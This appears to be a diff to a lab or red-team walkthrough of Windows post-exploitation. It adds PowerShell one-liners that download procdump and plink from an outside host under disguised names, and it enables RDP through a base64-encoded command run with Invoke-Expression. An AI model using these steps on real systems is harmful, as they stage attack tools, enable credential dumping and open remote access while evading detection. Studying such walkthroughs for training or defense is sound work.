@@ -91,6 +91,7 @@
    ![image](https://github.com/user-attachments/assets/ab124bb5-bdf1-4a87-aaa8-0b53bb3d2869)
 
    g. download `procdump.exe`
+   
       powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2:9000/file2.exe', 'C:\windows\temp\calc.exe')
 
    h. use `procdump.exe`
@@ -107,10 +108,24 @@
 
    a. first we will be downloading `plink.exe` as `ekern.exe`
 
-      (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2:9000/file.exe', 'C:\windows\temp\ekern.exe')
+      powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2:9000/file.exe', 'C:\windows\temp\ekern.exe')
 
+   b. by Default RDP is Disabled let's Check first
+
+      Get-Service -Name TermService
    
+   ![image](https://github.com/user-attachments/assets/2c8d0804-16c5-4961-9e13-6179a61d723d)
 
+   c. enable RDP but let's base64 encode this and put it in one-line command
+
+      Set-Service -Name TermService -StartupType Automatic
+      Start-Service -Name TermService
+      Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\' -Name 'fDenyTSConnections' -Value 0
+   
+   d. Encoded:
+
+      -Command "& {[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LVNlcnZpY2UgLU5hbWUgVGVybVNlcnZpY2UgLVN0YXJ0dXBUeXBlIEF1dG9tYXRpYw0KDQpTdGFydC1TZXJ2aWNlIC1OYW1lIFRlcm1TZXJ2aWNlDQoNClNldC1JdGVtUHJvcGVydHkgLVBhdGggJ0hLTE06XFN5c3RlbVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXFRlcm1pbmFsIFNlcnZlclwnIC1OYW1lICdmRGVueVRTQ29ubmVjdGlvbnMnIC1WYWx1ZSAw')) | Invoke-Expression}"
+   
 
 
 
